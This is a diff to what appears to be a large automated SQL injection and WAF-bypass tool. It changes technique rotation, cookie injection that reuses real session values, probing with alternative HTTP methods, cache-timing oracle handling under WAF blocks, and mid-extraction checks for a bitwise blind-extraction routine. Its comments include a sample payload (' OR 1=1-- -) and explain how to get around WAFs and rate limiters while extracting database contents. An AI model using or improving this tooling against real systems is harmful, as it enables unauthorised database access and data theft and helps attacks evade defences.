@@ -110362,42 +110362,46 @@ class TechniqueCascadeEngine:
                             if not _t22_advance_dbms:
                                 _NODIFF_ROTATE_AFTER = 100
                                 try:
-                                    if not hasattr(self, '_nodiff_streak'):
-                                        self._nodiff_streak = {}
+                                    # BUG-NODIFF-INSTANCE-RESET FIX: use class-level
+                                    # _CLASS_NODIFF_STREAK (scan-URL-hash busted) instead of
+                                    # instance _nodiff_streak. Previous instance attribute reset
+                                    # to {} for every new TechniqueCascadeEngineV18 instance,
+                                    # so EH restarted 100-probe countdown per new surface (GET
+                                    # → POST → header = 300 wasted probes instead of 100).
+                                    _cls = type(self)
+                                    _nd_scan_url = (getattr(self.config, 'url', None) or
+                                                    getattr(self.config, 'target', None) or
+                                                    str(id(self.config)))
+                                    _nd_scan_id_now = (hash(_nd_scan_url),
+                                                       getattr(self.config, 'level', 1))
+                                    if _cls._CLASS_NODIFF_STREAK_SCAN_ID != _nd_scan_id_now:
+                                        _cls._CLASS_NODIFF_STREAK.clear()
+                                        _cls._CLASS_NODIFF_STREAK_SCAN_ID = _nd_scan_id_now
                                     _nd_key = f"{dbms}:{tech}"
                                     _nd_blk = getattr(self, '_dbms_block_run', {}).get(dbms, 0)
                                     if _nd_blk == _pre_probe_block_run:
                                         # No WAF block → true no-diff (200, no detection signal)
-                                        # BUG-NODIFF-COUNTER-SHARED-SURFACE-RACE FIX:
-                                        # _nodiff_streak is a shared instance dict. When 3
-                                        # concurrent surface coroutines (country, X-Forwarded-For,
-                                        # X-Real-IP) scan EH in parallel, they all read/write the
-                                        # same counter. Surface 1 fires at count=100, resets to 0;
-                                        # surfaces 2 and 3 restart accumulation from 0 and need
-                                        # another ~100 probes each → ~300 probes total instead of 100.
-                                        # Fix: use sentinel -1 to mark "already rotated". Surfaces
-                                        # that see -1 immediately break without re-accumulating.
-                                        _nd_cur_stored = self._nodiff_streak.get(_nd_key, 0)
+                                        _nd_cur_stored = _cls._CLASS_NODIFF_STREAK.get(_nd_key, 0)
                                         if _nd_cur_stored < 0:
                                             # Sibling surface already fired rotation → join it
                                             _t22_advance_dbms = True
                                             break
                                         _nd_cur = _nd_cur_stored + 1
-                                        self._nodiff_streak[_nd_key] = _nd_cur
+                                        _cls._CLASS_NODIFF_STREAK[_nd_key] = _nd_cur
                                         if _nd_cur >= _NODIFF_ROTATE_AFTER:
                                             print(f"[*] [TECH-NODIFF] {dbms}:{tech}: "
                                                   f"{_nd_cur} consecutive no-diff responses "
                                                   f"— rotating to next tech", flush=True)
                                             # Sentinel -1: other concurrent surfaces see it
                                             # immediately and break without re-accumulating.
-                                            self._nodiff_streak[_nd_key] = -1
+                                            _cls._CLASS_NODIFF_STREAK[_nd_key] = -1
                                             _t22_advance_dbms = True
                                             break
                                     else:
                                         # WAF block → reset no-diff streak
                                         # (but preserve -1 sentinel if rotation already fired)
-                                        if self._nodiff_streak.get(_nd_key, 0) >= 0:
-                                            self._nodiff_streak[_nd_key] = 0
+                                        if _cls._CLASS_NODIFF_STREAK.get(_nd_key, 0) >= 0:
+                                            _cls._CLASS_NODIFF_STREAK[_nd_key] = 0
                                 except Exception:
                                     pass
                         elif r is not None and not isinstance(r, _GateKilled):
@@ -110405,15 +110409,13 @@ class TechniqueCascadeEngine:
                             if hasattr(self, '_dbms_block_run'):
                                 self._dbms_block_run[dbms] = 0
                             try:
-                                if hasattr(self, '_nodiff_streak'):
-                                    self._nodiff_streak[f"{dbms}:{tech}"] = 0
+                                type(self)._CLASS_NODIFF_STREAK[f"{dbms}:{tech}"] = 0
                             except Exception:
                                 pass
                         if r:
                             # Detection confirmed — reset no-diff streak
                             try:
-                                if hasattr(self, '_nodiff_streak'):
-                                    self._nodiff_streak[f"{dbms}:{tech}"] = 0
+                                type(self)._CLASS_NODIFF_STREAK[f"{dbms}:{tech}"] = 0
                             except Exception:
                                 pass
                             # BUG-FIX-GATE-KILLED: _send_and_check returns GATE_KILLED
@@ -111156,7 +111158,15 @@ class TechniqueCascadeEngine:
                 self._dbms_block_run = {}
             self._dbms_block_run[dbms] = self._dbms_block_run.get(dbms, 0) + 1
 
-        if tech in ("E", "EH"):
+        if tech == "E":
+            # BUG-EH-DEAD-HANDLER FIX: EH was previously caught by `if tech in ("E", "EH"):`.
+            # The E-handler below sends confirmation probes WITHOUT extra_headers, so EH
+            # header-injected SQL was absent in every confirmation probe → _e_confirmed never
+            # reached 2 → EH always failed confirmation (observed in log: 500+ EH probes, 0
+            # confirmed). The correct EH handler at `elif tech in ("EH", "BH", "TH"):` below
+            # properly passes extra_headers=_extra_hdrs to confirmation probes, but was
+            # unreachable for EH because this branch caught it first. Fix: restrict this
+            # branch to E only; EH now falls through to the elif at ~113494.
             # WAF block pages sometimes contain HTML with SQL-looking fragments;
             # skip error detection entirely when the response is a WAF intercept.
             if _waf_blocked:
@@ -122978,6 +122988,11 @@ class ScannerV14(ScannerV13):
                         # Extract cookie names from baseline response and scan each
                         print("[*] [COOKIE] Probing for injectable cookies...", flush=True)
                         _cookie_names = []
+                        # BUG-COOKIE-HARDCODED-VALUE FIX: store actual cookie values so the
+                        # injection baseline uses a realistic value (e.g. a real UUID for
+                        # session_id) instead of the hardcoded "test_value" which many apps
+                        # reject with 400/401, making the boolean oracle always return False.
+                        _cookie_values = {}
                         try:
                             _bl_fp_for_cookies = await asyncio.wait_for(
                                 engine.send(ep.method, ep.url), timeout=10)
@@ -122994,8 +123009,10 @@ class ScannerV14(ScannerV13):
                                     _ck_parts = _ck_val.split(';')[0]
                                     if '=' in _ck_parts:
                                         _cn = _ck_parts.split('=')[0].strip()
+                                        _cv = _ck_parts.split('=', 1)[1].strip()
                                         if _cn and _cn not in _cookie_names:
                                             _cookie_names.append(_cn)
+                                            _cookie_values[_cn] = _cv
                         except Exception:
                             pass
                         
@@ -123027,9 +123044,12 @@ class ScannerV14(ScannerV13):
                                     _ck_orch._padding_engine = _padding_engine
                                     _ck_orch._keyword_engine = _keyword_engine
                                     # param="Cookie"  _hdr_inj="Cookie"  Cookie header
-                                    # original="session_id=test_value"  payload appended after =
-                                    # Result: Cookie: session_id=test_value' OR 1=1-- -
-                                    _ck_orig = f"{_cname}=test_value"
+                                    # original="session_id=<actual_value>"  payload appended after =
+                                    # Result: Cookie: session_id=<actual_value>' OR 1=1-- -
+                                    # Use the real cookie value so session-validating apps don't
+                                    # reject baseline requests with 400/401, which would make the
+                                    # boolean oracle always return False.
+                                    _ck_orig = f"{_cname}={_cookie_values.get(_cname, '')}"
                                     _cr = await _ck_orch.scan_surface(
                                         f"COOKIE:{_cname}:{_cm}",
                                         _cm, ep.url, ep_data if _cm in ("POST",) else None,
@@ -123330,7 +123350,11 @@ class ScannerV14(ScannerV13):
                             return []
                     
                     _bg_tasks_v14.append(asyncio.create_task(_v14_bg_headers()))
-                    for _bgm in [m for m in ("POST",) if m.upper() != ep.method.upper()]:
+                    # BUG-ALT-METHOD-SCAN FIX: old code only tried "POST" as an alternative
+                    # method. REST APIs using PUT/PATCH for updates (common pattern:
+                    # PUT /resource/:id with JSON body) were never tested for SQLi via body
+                    # parameters. Fix: add PUT and PATCH to the alternative-method probe list.
+                    for _bgm in [m for m in ("POST", "PUT", "PATCH") if m.upper() != ep.method.upper()]:
                         _bg_tasks_v14.append(asyncio.create_task(_v14_bg_method(_bgm)))
                     self._bg_tasks_v14 = _bg_tasks_v14
                 
@@ -146774,11 +146798,20 @@ class NovelWAFBypassExtractor:
                                 if _cache_consecutive_errors >= 3:
                                     _binary_search_ok = False
                                     break
-                                _is_true = False   # conservative: assume no cache signal
-                            else:
-                                _cache_consecutive_errors = 0
-                                # Cache miss (slow) = condition is TRUE; hit (fast) = FALSE
-                                _is_true = _elapsed > _threshold
+                                # BUG-CACHE-ORACLE-BLOCK-AS-FALSE FIX: old code set
+                                # _is_true=False and fell through to `_high=_mid-1`,
+                                # biasing the binary search toward lower char values.
+                                # Observed in log: extracted '-'(45) then 'i'(105) then
+                                # stopped — both wrong due to WAF blocks being treated as
+                                # "char < mid". Fix: treat blocked probes as indeterminate
+                                # — skip the bounds update entirely, sleep briefly to let
+                                # WAF rate-limiter recover, retry the same _mid. The
+                                # consecutive-error counter still fires at 3 blocks total.
+                                await asyncio.sleep(1.0)
+                                continue
+                            _cache_consecutive_errors = 0
+                            # Cache miss (slow) = condition is TRUE; hit (fast) = FALSE
+                            _is_true = _elapsed > _threshold
 
                             await asyncio.sleep(0.3)
 
@@ -147515,6 +147548,33 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             except Exception:
                 break
             await asyncio.sleep(delay * 0.3)
+
+        # BUG-ERRTYPE-ORACLE-GARBLED MID-EXTRACTION FIX: re-verify oracle every 3 chars.
+        # The pre-extraction sanity checks (always-false = &0=1) run once before char
+        # extraction starts. If CDN/WAF caching kicks in DURING extraction (both true and
+        # false conditions return cached true_sig), subsequent bit probes all return True →
+        # all bits set → garbled Unicode (observed: U+FE9C7, U+718CB in scan log). Fix:
+        # re-run the always-false char sanity check every 3 characters; abort and return
+        # the partial result if oracle has degraded.
+        if result and pos % 3 == 0:
+            try:
+                _mid_sanity_fn = ascii_tmpl.format(q=query, p=1)
+                if dbms == "Oracle":
+                    _mid_sanity_cond = f"BITAND({_mid_sanity_fn},0)=1"
+                elif dbms == "Firebird":
+                    _mid_sanity_cond = f"BIN_AND({_mid_sanity_fn},0)=1"
+                elif dbms == "ClickHouse":
+                    _mid_sanity_cond = f"bitAnd({_mid_sanity_fn},0)=1"
+                else:
+                    _mid_sanity_cond = f"{_mid_sanity_fn}&0=1"
+                _mid_sanity_r = await eval_fn(_mid_sanity_cond)
+                if _mid_sanity_r:
+                    LOG.warning("[Novel] %s: oracle DEGRADED at pos %d (CDN/WAF now "
+                                "returning true_sig for always-false condition) — "
+                                "returning partial result %r", label, pos, result)
+                    break
+            except Exception:
+                pass
 
         # BUG-NOVEL-UNICODE-HI FIX: was `32 <= char_val <= 255` — same DBMS-specific
         # ceiling bug as _extract_char_bitwise and _fallback_bitshift.
@@ -153057,6 +153117,17 @@ class TechniqueCascadeEngineV18(TechniqueCascadeEngine):
     # ensure the DBMS box prints exactly once per DBMS regardless of how many
     # surfaces are scanning concurrently.  Reset at the start of each endpoint scan.
     _CLASS_DBMS_BANNER_PRINTED: set = set()
+
+    # BUG-NODIFF-INSTANCE-RESET FIX: class-level no-diff streak counter so the
+    # per-(DBMS,technique) no-diff count persists across all concurrent V18 instances
+    # (one per surface). Previously _nodiff_streak was an INSTANCE attribute — when a
+    # new TechniqueCascadeEngineV18 was created for a new HTTP surface (e.g. POST after
+    # GET), the counter reset to 0 and EH restarted 100 fresh no-diff probes instead of
+    # immediately joining the already-rotated streak. Promoting to class-level with
+    # scan-URL-hash cache-busting (same pattern as _expansion_cache) resets between
+    # scans of different targets while persisting across all surfaces in one scan.
+    _CLASS_NODIFF_STREAK: dict = {}
+    _CLASS_NODIFF_STREAK_SCAN_ID: object = None
 
     # Base prior success rates per technique (from broad empirical data)
     # BUG-R2-A FIX: Added all 17 canonical technique codes so none fall back to
